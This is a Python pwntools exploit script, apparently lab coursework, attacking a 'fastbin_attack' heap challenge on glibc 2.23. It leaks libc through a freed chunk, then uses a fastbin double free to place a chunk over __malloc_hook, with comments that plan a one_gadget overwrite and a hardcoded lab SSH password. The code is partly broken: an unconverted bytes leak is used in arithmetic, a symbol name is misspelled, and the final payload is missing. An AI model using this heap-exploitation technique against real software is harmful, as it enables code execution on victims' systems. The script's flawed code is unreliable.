from pwn import *
from getpass import *
import logging
import time
import re

libc = ELF("./libc-2-23.so")
#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
print(len(sys.argv))
if len(sys.argv)==1:
    #REMOTE EXPLOIT
    site = "training.jinblack.it"
    port = 4006
    c =  remote(site,port)
    process = "./fastbin_attack"
    script_name = sys.argv
else:

    script_name, debug= sys.argv

    #SSH EXPLOIT : PLEASE NOTE IT IS NOT POSSIBLE TO USE GDB.DEBUG THROUGH SSH USE GDB.ATTACH
    host = "acidburn"

    ip = "127.0.0.1"

    category = "heap"
    proc = "fastbin"
    #path = "/challenges/rop/ropasaurusrex/"
    path = "/challenges/"+category+"/"+proc+"/"
    #prt = int(input(" insert "+host+"'s port to connect to:"))
    prt = 3022

    #pwd = getpass("insert "+host+"'s password:")
    pwd = "0607991337"

    print("Connecting to "+host+" at "+ip+" to execute syscall")
    ssh_p = ssh(host,ip,password=pwd,port= prt)

    startup_command ="."+path+"ld-2.23.so --library-path"+ " ."+path+" ."+path+proc

    #process = "."+path+proc
    process = "."+path+"fastbinpatch"
    process = startup_command.split(" ")

    if ( debug == '-d') :#it is a PIE binary
        gdbc = '''
                    brva 0x0c21 fastbin
                    c
               '''
        #c = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
    else:
        c = ssh_p.process(process)
    c = ssh_p.process(process)
    gdb.attach(c,'''
                c
                ''')
    print("wait")
    #we want primitive functions in order to read / write , so that building a complex exploit would be ez
    def alloc(size):
        c.recvuntil(b"> ")
        c.sendline(b"1")
        c.recvuntil(b"Size: ")
        c.sendline(b"%d" % size)
        #we need to retrieve the index
        indexline = c.recvuntil("!")
        m = re.match(b"Allocated at index (\d+)!",indexline )
        return int(m.group(1))
    input("Press a key")


    def write_chunk(index, content):
        c.recvuntil(b"> ")
        c.sendline(b"2")
        c.recvuntil(b"Index: ")
        c.sendline(b"%d" % index)
        c.recvuntil(b"Content: ")
        c.send(content)
        #c.recvuntil(b"Done")

    def read_chunk(index):
        c.recvuntil(b"> ")
        c.sendline(b"3")
        c.recvuntil(b"Index: ")
        c.sendline(b"%d" % index)
        data = c.recvuntil(b"Options:\n")
        return data[:-len(b"Options:\n")]

    def free_chunk(index):
        c.recvuntil(b"> ")
        c.sendline(b"4")
        c.recvuntil(b"Index: ")
        c.sendline(b"%d" % index)

    chunk_a = alloc(10)
    write_chunk(chunk_a, b"asdasd")
    print(chunk_a, read_chunk(chunk_a))
    #How do you leak the libc ?
    #allocate and free a small bit, if you can read then you'll leak the libc, as the backward pointer will go there

    #chunk_a = alloc(0x200)
    #free_chunk(chunk_a)
    #print(chunk_a, read_chunk(chunk_a))
    #it doesn't initially work because you are debugging the loader in the binary (regarding brva 0x0c21)

    #gameplan is
    # alloc(a)
    # alloc(b) without this the free(a) would lead to a consolidation !
    # free(a)

    chunk_a = alloc(0x200)#fastbin doesn't have libc addr so it needs to be big
    chunk_b = alloc(0x300)
    free_chunk(chunk_a)
    libc_leak = read_chunk(chunk_a)[:6]+b"\x00\x00"#print(chunk_a, read_chunk(chunk_a))
    #to calculate it: use vmmap to check out the beginning and calculate the OFFSET !
    libc_base = libc_leak - 0x3c4b78

    libc.address = libc_base
    free_hook = libc.symbols["__free_hook"]
    malloc_hook = libc.symbols["__malloc_hook_"]

    target = libc_base + 0x3c4af5

    print("[!] libc_leak: %#x" % libc_leak)
    print("[!] libc_base: %#x" % libc_base)
    print("[!] __free_hook_: %#x" % free_hook)
    print("[!] __malloc_hook_: %#x" % malloc_hook)
    print("[!] target : %#x" % target)



    #if you were to do x/30gx (RDI) 0x7ffff7fff010
    # you would find two addresses in there ( 0x00007ffff7bcdb78)
    # by checking vmmap 0x00007ffff7bcdb78 you'll see that it has leaked libc-2.23.so +0xb78
    # the address we are leaking is the fd


    # to check address of free hook use :: p (char*)&__free_hook
    #now that we have the leak , what will we do ?
    #allocate the chunk with the size of a fastbin (0x90)
    #allocate another one
    #free(first)
    #free(second)
    #when we do the free then we'll not be able to write the chunk ,
    #but maybe we'll be able to allocate it again , (the same chunk in other indexes)

    #then we free it
    #then we free the second one but we'll still have a reference
    #so we'll overwrite the first one with the desired reference to either free hook or malloc hook
    #you need to find the right size of the

    #SIZE = 0x40 after all the deliberation on finding the correct sizing for the chunk
    SIZE = 0x60

    input("before allocation")

    chunk_1 = alloc(SIZE)
    chunk_2 = alloc(SIZE)

    input("before free")

    free_chunk(chunk_1)
    free_chunk(chunk_2)

    input("before double free")

    free_chunk(chunk_1)

    input("before allocation ")

    chunk_A = alloc(SIZE)

    input("")

    #write_chunk(chunk_A,b"A"*8)#we'll try to write something in the __free_hook we now have a pointer to it
    write_chunk(chunk_A, p64(target))# REMEMBER TO CHANGE IT!!!!!

    input("")
    chunk_B = alloc(SIZE)
    chunk_C = alloc(SIZE)

    input("TRIGGER")
    chunk_D = alloc(SIZE) # we'll need another allocation after we have written to the free_hook


    #so after the input TRIGGER (according to old unfixed version) we'll get the following error

    # b"*** Error in './fastbin_attack': malloc(): memory corruption(fast): 0x00007ffff7dd37b8 ***\n"

    # what is it ? got to glibc source code >look for malloc/malloc.c to see the error
    # the problem is that it is checking the size of the chunk and it is not what he expected
    # so basically we are trying to allocate something whose size is 0x40(+0x10 due to overhead)
    # then the true size is not 0x50 so it crashes
    # a solution could be found if the debugging symbols where there, but they're not here so..
    # we have to put the correct size there, how do we do ? We get lucky ? How would we find it ?
    # we have to find a byte that is not zero close to our target such that we can use that byte as
    # the defined size and such size is big enough that the target is going to be inside that chunk
    # then we bypassed this particular control mech
    #
    # so what we'll do ? We go back in the memory of our target ( the __free_hook)
    # and see if there's something that is not zero, and we'll match the SIZE var with those
    # particular bytes !
    #
    #  x/30gx 0x7ffff7dd37a8
    # there are tons of zeroes....
    # we'll iterate with  x/40gx 0x7ffff7dd37a8 - 0x30 and then more to check where will be the first
    # non zero byte ... plot twist : there are no non-zero bytes so this attack is not possible with
    # the __free_hook_ we'll have to go to the __malloc_hook_

    #So in general we need stuff that is not zero BEFORE !!! our malloc_hook so that we can
    # dimensionate our chunk !

    #  x/40gx 0x7ffff7dd1b10 - 0x30
    # we have also found the memalign_hook but the size needs to be the same...
    # 0x00007ffff7a92a70 is WAAAAAY too big for a chunk size
    # we need something less than 256 (hex) , how do we do ?
    #
    # x /30gx 0x7ffff7dd1af0

    # The trick here is that we are looking at addresses that are 8-byte aligned
    # If we want to make the first 7f our size then we'll have to change the alignment

    # last two bytes will become first e0, then e8 because we have to get closer !!
    # we'll settle for 0x7ffff7dd1aed
    #  the correct address would be that + 0x8  (...af5)

    # so we have changed the size to 0x60
    # the other thing is that we have to compute the offset, with vmmap we'll find
    # the offset of the libc

    # >ipython3 $ hex(0x7ffff7dd1af5 - 0x7ffff7a0d000) = ..
    # are we actually allocating ?


    # b"*** Error in './fastbin_attack': malloc(): memory corruption(fast): 0x00007ffff7dd37b8 ***\n"
    #we clearly are still not matching the size

    # to do it the right way we'll have to open the library (libc-2.23.so )in ghidra and put a
    # breakpoint in there...

    # that is the dead end, the prof in the end cheats and looks at his solution

    # it goes again at the malloc hook and sees that there were other numbers before that 7f
    #
    # now the only thing you need is to overwrite the malloc_hook with a one_gadget, execute
    # malloc and profit!

    #to see the heap you have to use the patchelf
    c.interactive()
